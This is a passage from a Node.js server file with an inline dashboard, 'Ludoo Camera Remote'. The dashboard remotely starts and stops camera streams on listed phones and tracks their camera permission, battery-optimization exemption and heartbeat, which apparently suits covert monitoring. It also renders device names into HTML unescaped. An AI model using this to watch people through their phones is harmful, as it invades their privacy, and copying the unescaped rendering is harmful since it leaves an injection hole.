        const fps = parseInt(fpsSlider.value) || 15;
        const interval = Math.max(50, Math.round(1000 / fps));
        framePollTimer = setInterval(() => {
            if (!selectedDeviceId || !isStreaming) return;
            fetch('/api/frame/' + selectedDeviceId)
                .then(r => r.json())
                .then(data => {
                    if (data.success && data.image && data.ts > lastFrameTs) {
                        lastFrameTs = data.ts;
                        updateFrame('data:image/jpeg;base64,' + data.image);
                    }
                }).catch(() => {});
        }, interval);
    }
    function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }

    function sendCommand(command, value) {
        if (!selectedDeviceId) { alert('Select a device first'); return; }
        if (wsReady) {
            socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
        } else {
            fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
            }).catch(() => {});
        }
    }

    document.getElementById('startBtn').onclick = () => {
        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
        userStoppedStream = false;
        sendCommand('start');
        isStreaming = true; wasStreaming = false;
        disconnectedOverlay.classList.remove('show');
        startFramePoll();
    };
    document.getElementById('stopBtn').onclick = () => {
        if (!selectedDeviceId) return;
        userStoppedStream = true;
        sendCommand('stop');
        isStreaming = false; wasStreaming = false;
        stopFramePoll();
        video.src = ''; video.style.display = 'none';
        placeholder.style.display = 'block';
        disconnectedOverlay.classList.remove('show');
        fpsCountSpan.textContent = '0';
        videoOverlay.classList.remove('active');
        overlayVideo.src = ''; overlayVideo.style.display = 'none';
        overlayPlaceholder.style.display = 'flex';
    };
    document.getElementById('flipBtn').onclick = () => sendCommand('flip');

    document.querySelectorAll('.quality-btn').forEach(btn => {
        btn.onclick = () => {
            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            sendCommand('quality', parseInt(btn.dataset.quality));
        };
    });
    fpsSlider.oninput = () => {
        const fps = parseInt(fpsSlider.value);
        fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
        sendCommand('fps', fps);
        if (isStreaming) startFramePoll();
    };

    let overlayRotation = 0;
    function setDefaultOverlaySize() {
        const vw = window.innerWidth, vh = window.innerHeight;
        let w = Math.round(vw * 0.88), h = Math.round(w * 9 / 16);
        if (h > vh * 0.82) { h = Math.round(vh * 0.82); w = Math.round(h * 16 / 9); }
        overlayWrap.style.width = w + 'px'; overlayWrap.style.height = h + 'px';
    }
    function applyOverlayTransform() { overlayVideo.style.transform = 'rotate(' + overlayRotation + 'deg)'; }
    function syncOverlayFrame() {
        if (video.src && video.style.display !== 'none') {
            overlayVideo.src = video.src; overlayVideo.style.display = 'block'; overlayPlaceholder.style.display = 'none';
        } else { overlayVideo.style.display = 'none'; overlayPlaceholder.style.display = 'flex'; }
        applyOverlayTransform();
    }
    document.getElementById('expandBtn').addEventListener('click', () => { setDefaultOverlaySize(); overlayRotation = 0; applyOverlayTransform(); videoOverlay.classList.add('active'); syncOverlayFrame(); });
    document.getElementById('overlayCloseBtn').addEventListener('click', () => videoOverlay.classList.remove('active'));
    document.getElementById('rotateBtn').addEventListener('click', () => { overlayRotation = (overlayRotation + 90) % 360; applyOverlayTransform(); });

    let isResizing = false, resizeStartX, resizeStartY, resizeStartW, resizeStartH;
    document.getElementById('overlayResizeHandle').addEventListener('mousedown', e => {
        e.preventDefault(); isResizing = true;
        resizeStartX = e.clientX; resizeStartY = e.clientY;
        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
    });
    document.addEventListener('mousemove', e => {
        if (!isResizing) return;
        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.clientX - resizeStartX)) + 'px';
        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.clientY - resizeStartY)) + 'px';
    });
    document.addEventListener('mouseup', () => isResizing = false);

    document.getElementById('overlayResizeHandle').addEventListener('touchstart', e => {
        e.preventDefault(); isResizing = true;
        resizeStartX = e.touches[0].clientX; resizeStartY = e.touches[0].clientY;
        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
    }, { passive: false });
    document.addEventListener('touchmove', e => {
        if (!isResizing) return;
        e.preventDefault();
        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.touches[0].clientX - resizeStartX)) + 'px';
        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.touches[0].clientY - resizeStartY)) + 'px';
    }, { passive: false });
    document.addEventListener('touchend', () => isResizing = false);

    let pinchStartDist = 0, pinchStartW = 0, pinchStartH = 0;
    function getTouchDist(touches) {
        const dx = touches[0].clientX - touches[1].clientX;
        const dy = touches[0].clientY - touches[1].clientY;
        return Math.sqrt(dx * dx + dy * dy);
    }
    overlayWrap.addEventListener('touchstart', e => {
        if (e.touches.length === 2) {
            e.preventDefault();
            pinchStartDist = getTouchDist(e.touches);
            pinchStartW = overlayWrap.offsetWidth;
            pinchStartH = overlayWrap.offsetHeight;
        }
    }, { passive: false });
    overlayWrap.addEventListener('touchmove', e => {
        if (e.touches.length === 2) {
            e.preventDefault();
            const dist = getTouchDist(e.touches);
            const scale = dist / pinchStartDist;
            const newW = Math.min(window.innerWidth - 20, Math.max(160, pinchStartW * scale));
            const newH = Math.min(window.innerHeight - 20, Math.max(100, pinchStartH * scale));
            overlayWrap.style.width  = newW + 'px';
            overlayWrap.style.height = newH + 'px';
        }
    }, { passive: false });

    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
    function showDeviceStatus(device) {
        document.getElementById('modalDeviceName').textContent = '📱 ' + device.name;
        const battery = device.batteryPercentage || 0;
        const ws = device.hasWebSocket;
        document.getElementById('modalContent').innerHTML =
            '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
            '<div class="status-item"><span class="status-label">WebSocket</span><span class="' + (ws ? 'status-allowed' : 'status-pending') + '">' + (ws ? '⚡ Active' : '⏳ HTTP only') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored (Allowed)' : '❌ Not Ignored (Denied)') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
            '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
            '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
        document.getElementById('statusModal').style.display = 'flex';
    }

    function selectDevice(deviceId) {
        if (selectedDeviceId === deviceId) return;
        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
        selectedDeviceId = deviceId;
        wasStreaming = false; isStreaming = false; userStoppedStream = false;
        lastFrameTs = 0;
        disconnectedOverlay.classList.remove('show');
        video.src = ''; video.style.display = 'none';
        placeholder.textContent = '▶ Press START to stream'; placeholder.style.display = 'block';
        fpsCountSpan.textContent = '0';
        renderDeviceList();
    }

    function renderDeviceList() {
        const connected = currentDevices.filter(d => d.isConnected);
        deviceCountSpan.textContent = connected.length;
        if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; }
        devicesList.innerHTML = connected.map(d =>
            '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-id="' + d.id + '">' +
            '<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0;">' +
            '<span class="device-name" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">📱 ' + d.name + (d.hasWebSocket ? ' <span style="font-size:10px;color:#4CAF50">⚡WS</span>' : '') + '</span>' +
            (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
            '</div>' +
            '<div style="display:flex;align-items:center;gap:8px;">' +
            '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:11px;padding:3px 8px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
            '<div class="device-status-dot status-connected"></div>' +
            '</div></div>'
        ).join('');
        devicesList.querySelectorAll('.device-item').forEach(el => {
            el.addEventListener('click', (e) => {
                if (e.target.dataset.info) { const d = currentDevices.find(x => x.id === e.target.dataset.info); if (d) showDeviceStatus(d); return; }
                selectDevice(el.dataset.id);
            });
        });
    }

    function checkSelectedDeviceStatus(list) {
        if (!selectedDeviceId) return;
        const sel = list.find(d => d.id === selectedDeviceId);
        if (sel && !sel.isConnected && isStreaming) {
            wasStreaming = true; stopFramePoll(); disconnectedOverlay.classList.add('show'); fpsCountSpan.textContent = '0';
        } else if (sel && sel.isConnected && wasStreaming && !isStreaming && !userStoppedStream) {
            wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommand('start'); startFramePoll();
        }
    }

    async function fetchDevices() {
        try {
            const data = await fetch('/api/devices').then(r => r.json());
            if (data.success) {
                currentDevices = data.devices;
                if (!selectedDeviceId && currentDevices.filter(d => d.isConnected).length > 0) {
                    selectDevice(currentDevices.filter(d => d.isConnected)[0].id);
                    return;
                }
                checkSelectedDeviceStatus(currentDevices);
                renderDeviceList();
            }
        } catch(e) {}
    }

    fetchDevices();
    setInterval(fetchDevices, 3000);
</script>
</body>
</html>`);
});

// ========== START ==========
const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log('');
    console.log('═══════════════════════════════════════════════════');
    console.log('✅  Ludoo Camera Remote  —  WebSocket + HTTP Mode');
    console.log('═══════════════════════════════════════════════════');
    console.log('🌐  Web UI       : http://localhost:' + PORT);
    console.log('🔑  Password     : ' + DASHBOARD_PASSWORD);
    console.log('📦  Batch Upload : POST /api/batch');
    console.log('⚡  WebSocket    : Stream Only');
    console.log('📡  Commands     : HTTP Polling + WS');
    console.log('═══════════════════════════════════════════════════');
    console.log('');
});
